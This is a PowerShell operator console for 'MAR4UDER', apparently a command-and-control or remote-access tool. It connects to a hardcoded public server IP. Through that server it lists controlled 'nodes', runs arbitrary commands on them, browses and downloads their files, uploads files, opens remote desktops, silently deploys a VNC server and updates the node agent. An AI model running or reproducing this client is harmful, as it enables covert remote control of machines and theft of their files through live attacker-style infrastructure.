# ==============================================================================
# MAR4UDER Windows Operator CLI (m4r.ps1)
# Interactive console & REST management for Windows
# ==============================================================================

param (
    [string]$Command = "console",
    [string]$Arg1 = "",
    [string]$Arg2 = "",
    [string]$Arg3 = ""
)

$ServerHost = if ($env:MAR4UDER_HOST) { $env:MAR4UDER_HOST } else { "104.143.206.163" }
$HttpPort   = if ($env:MAR4UDER_HTTP_PORT) { $env:MAR4UDER_HTTP_PORT } else { "8080" }
$NcPort     = if ($env:MAR4UDER_NC_PORT) { [int]$env:MAR4UDER_NC_PORT } else { 9000 }
$RfbPort    = if ($env:MAR4UDER_RFB_PORT) { [int]$env:MAR4UDER_RFB_PORT } else { 5900 }
$ApiUrl     = "http://$ServerHost`:$HttpPort/api/v1"

function Show-Help {
    Write-Host "`nMAR4UDER // Windows Operator CLI (m4r.ps1)" -ForegroundColor Cyan
    Write-Host "Target Server: $ServerHost (API: $HttpPort, Console: $NcPort)" -ForegroundColor DarkGray
    Write-Host "Usage:" -ForegroundColor Gray
    Write-Host "  .\m4r.ps1                          - Open interactive Netcat TUI Console" -ForegroundColor White
    Write-Host "  .\m4r.ps1 list                     - List all connected nodes & status" -ForegroundColor White
    Write-Host "  .\m4r.ps1 exec <node_id> <cmd>     - Execute isolated command directly" -ForegroundColor White
    Write-Host "  .\m4r.ps1 fs <node_id> [path]      - Explore filesystem on node" -ForegroundColor White
    Write-Host "  .\m4r.ps1 get <node_id> <rem_path> - Download file from node" -ForegroundColor White
    Write-Host "  .\m4r.ps1 put <node_id> <local>    - Upload file to node" -ForegroundColor White
    Write-Host "  .\m4r.ps1 vnc <node_id>            - Open HTML5 Canvas Desktop in browser" -ForegroundColor White
    Write-Host "  .\m4r.ps1 krfb <node_id>           - Auto-install & deploy KRFB on node" -ForegroundColor White
    Write-Host "  .\m4r.ps1 update <node_id>         - Upgrade node agent to newest binary" -ForegroundColor White
    Write-Host "  .\m4r.ps1 web                      - Open Web Dashboard in browser`n" -ForegroundColor White
}

function Start-TcpConsole {
    param(
        [string]$HostName,
        [int]$Port
    )

    $cmdPy = Join-Path $PSScriptRoot "command.py"
    if (Test-Path $cmdPy) {
        python $cmdPy console
        return
    }

    if (Get-Command ncat -ErrorAction SilentlyContinue) {
        ncat $HostName $Port
        return
    }
    if (Get-Command nc -ErrorAction SilentlyContinue) {
        nc $HostName $Port
        return
    }

    $csharpCode = @"
using System;
using System.Net.Sockets;
using System.Text;
using System.Threading;

public class M4rSocketConsole {
    public static void Connect(string host, int port) {
        Console.WriteLine("[*] Connecting to MAR4UDER Console ({0}:{1})...", host, port);
        try {
            using (var client = new TcpClient()) {
                client.NoDelay = true;
                client.Connect(host, port);
                var stream = client.GetStream();
                var running = true;

                var readThread = new Thread(() => {
                    byte[] buffer = new byte[4096];
                    try {
                        while (running && client.Connected) {
                            int bytesRead = stream.Read(buffer, 0, buffer.Length);
                            if (bytesRead > 0) {
                                Console.Write(Encoding.UTF8.GetString(buffer, 0, bytesRead));
                            } else {
                                break;
                            }
                        }
                    } catch {}
                    running = false;
                });
                readThread.IsBackground = true;
                readThread.Start();

                while (running && client.Connected) {
                    if (Console.KeyAvailable) {
                        var key = Console.ReadKey(true);
                        if (key.Key == ConsoleKey.C && (key.Modifiers & ConsoleModifiers.Control) != 0) {
                            stream.Write(new byte[] { 3 }, 0, 1);
                            stream.Flush();
                        } else if (key.Key == ConsoleKey.Enter) {
                            byte[] crlf = Encoding.UTF8.GetBytes("\r\n");
                            stream.Write(crlf, 0, crlf.Length);
                            stream.Flush();
                        } else if (key.Key == ConsoleKey.Backspace) {
                            stream.Write(new byte[] { 8 }, 0, 1);
                            stream.Flush();
                        } else if (key.Key == ConsoleKey.Tab) {
                            stream.Write(new byte[] { 9 }, 0, 1);
                            stream.Flush();
                        } else if (key.Key == ConsoleKey.Escape) {
                            stream.Write(new byte[] { 27 }, 0, 1);
                            stream.Flush();
                        } else if (key.KeyChar != 0) {
                            byte[] bytes = Encoding.UTF8.GetBytes(key.KeyChar.ToString());
                            stream.Write(bytes, 0, bytes.Length);
                            stream.Flush();
                        }
                    } else {
                        Thread.Sleep(10);
                    }
                }
                running = false;
            }
            Console.WriteLine("\n[*] Disconnected.");
        } catch (Exception ex) {
            Console.WriteLine("\n[-] Connection error: " + ex.Message);
        }
    }
}
"@
    try {
        if (-not ([System.Management.Automation.PSTypeName]'M4rSocketConsole').Type) {
            Add-Type -TypeDefinition $csharpCode -Language CSharp
        }
        [M4rSocketConsole]::Connect($HostName, $Port)
    } catch {
        Write-Host "[-] Console launch error: $_" -ForegroundColor Red
    }
}

switch ($Command.ToLower()) {
    "console" {
        Start-TcpConsole -HostName $ServerHost -Port $NcPort
    }

    "list" {
        Write-Host "[*] Fetching registered nodes from $ApiUrl/nodes ..." -ForegroundColor Cyan
        try {
            $resp = Invoke-RestMethod -Uri "$ApiUrl/nodes" -Method Get
            if ($resp.Count -eq 0) {
                Write-Host "[-] No nodes currently registered." -ForegroundColor Yellow
            } else {
                $resp | Select-Object slot, id, is_online, hostname, remote_addr, vnc_engine, vnc_port, note | Format-Table -AutoSize
            }
        } catch {
            Write-Host "[-] Error querying API: $_" -ForegroundColor Red
        }
    }

    "exec" {
        if (-not $Arg1 -or -not $Arg2) {
            Write-Host "[-] Usage: .\m4r.ps1 exec <node_id> <command>" -ForegroundColor Red
            return
        }
        $body = @{ command = $Arg2 } | ConvertTo-Json
        try {
            $res = Invoke-RestMethod -Uri "$ApiUrl/nodes/$Arg1/cmd" -Method Post -Body $body -ContentType "application/json"
            if ($res.output) {
                Write-Host $res.output
            } else {
                Write-Host ($res | ConvertTo-Json -Depth 3)
            }
        } catch {
            Write-Host "[-] Exec failed: $_" -ForegroundColor Red
        }
    }

    "fs" {
        if (-not $Arg1) {
            Write-Host "[-] Usage: .\m4r.ps1 fs <node_id> [path]" -ForegroundColor Red
            return
        }
        $path = if ($Arg2) { $Arg2 } else { "/" }
        try {
            $res = Invoke-RestMethod -Uri "$ApiUrl/nodes/$Arg1/fs?path=$path" -Method Get
            Write-Host "`nListing: $($res.current_path)" -ForegroundColor Cyan
            $res.entries | Select-Object perm, is_dir, size, name | Format-Table -AutoSize
        } catch {
            Write-Host "[-] FS listing failed: $_" -ForegroundColor Red
        }
    }

    "get" {
        if (-not $Arg1 -or -not $Arg2) {
            Write-Host "[-] Usage: .\m4r.ps1 get <node_id> <remote_path> [local_dest]" -ForegroundColor Red
            return
        }
        $localPath = if ($Arg3) { $Arg3 } else { Split-Path $Arg2 -Leaf }
        Write-Host "[*] Requesting download: $Arg2 from $Arg1..." -ForegroundColor Cyan
        try {
            $body = @{ remote_path = $Arg2 } | ConvertTo-Json
            $dlReq = Invoke-RestMethod -Uri "$ApiUrl/nodes/$Arg1/download" -Method Post -Body $body -ContentType "application/json"
            if ($dlReq.file_id) {
                Invoke-WebRequest -Uri "$ApiUrl/files/$($dlReq.file_id)" -OutFile $localPath
                Write-Host "[+] Saved to $localPath" -ForegroundColor Green
            } else {
                Write-Host "[-] Failed to fetch file: $($dlReq | ConvertTo-Json)" -ForegroundColor Red
            }
        } catch {
            Write-Host "[-] Download error: $_" -ForegroundColor Red
        }
    }

    "put" {
        if (-not $Arg1 -or -not $Arg2) {
            Write-Host "[-] Usage: .\m4r.ps1 put <node_id> <local_file> [remote_dest]" -ForegroundColor Red
            return
        }
        if (-not (Test-Path $Arg2)) {
            Write-Host "[-] Local file not found: $Arg2" -ForegroundColor Red
            return
        }
        $remPath = if ($Arg3) { $Arg3 } else { "/tmp/" + (Split-Path $Arg2 -Leaf) }
        Write-Host "[*] Uploading $Arg2 -> $Arg1`:$remPath ..." -ForegroundColor Cyan
        try {
            $bytes = [System.IO.File]::ReadAllBytes((Resolve-Path $Arg2))
            $b64 = [Convert]::ToBase64String($bytes)
            $body = @{
                path = $remPath
                data = $b64
            } | ConvertTo-Json
            $res = Invoke-RestMethod -Uri "$ApiUrl/nodes/$Arg1/receive_file" -Method Post -Body $body -ContentType "application/json"
            Write-Host "[+] Upload status: $($res.status)" -ForegroundColor Green
        } catch {
            Write-Host "[-] Upload error: $_" -ForegroundColor Red
        }
    }

    "vnc" {
        $url = "http://$ServerHost`:$HttpPort/"
        Write-Host "[+] Opening HTML5 Web Desktop: $url" -ForegroundColor Green
        Start-Process $url
    }

    "krfb" {
        if (-not $Arg1) {
            Write-Host "[-] Usage: .\m4r.ps1 krfb <node_id>" -ForegroundColor Red
            return
        }
        $body = @{ vnc_engine = "krfb" } | ConvertTo-Json
        try {
            $res = Invoke-RestMethod -Uri "$ApiUrl/nodes/$Arg1/settings" -Method Post -Body $body -ContentType "application/json"
            Write-Host "[+] KRFB engine deployment requested for $Arg1" -ForegroundColor Green
        } catch {
            Write-Host "[-] Error: $_" -ForegroundColor Red
        }
    }

    "update" {
        if (-not $Arg1) {
            Write-Host "[-] Usage: .\m4r.ps1 update <node_id>" -ForegroundColor Red
            return
        }
        try {
            $res = Invoke-RestMethod -Uri "$ApiUrl/nodes/$Arg1/update" -Method Post
            Write-Host "[+] Update dispatched to node $Arg1" -ForegroundColor Green
        } catch {
            Write-Host "[-] Error: $_" -ForegroundColor Red
        }
    }

    "web" {
        $url = "http://$ServerHost`:$HttpPort/"
        Start-Process $url
    }

    default {
        if ($Command -match '^\d+$' -or $Command -match '^mos-') {
            Write-Host "[*] Target node: $Command" -ForegroundColor Cyan
            Start-TcpConsole -HostName $ServerHost -Port $NcPort
        } else {
            Show-Help
        }
    }
}
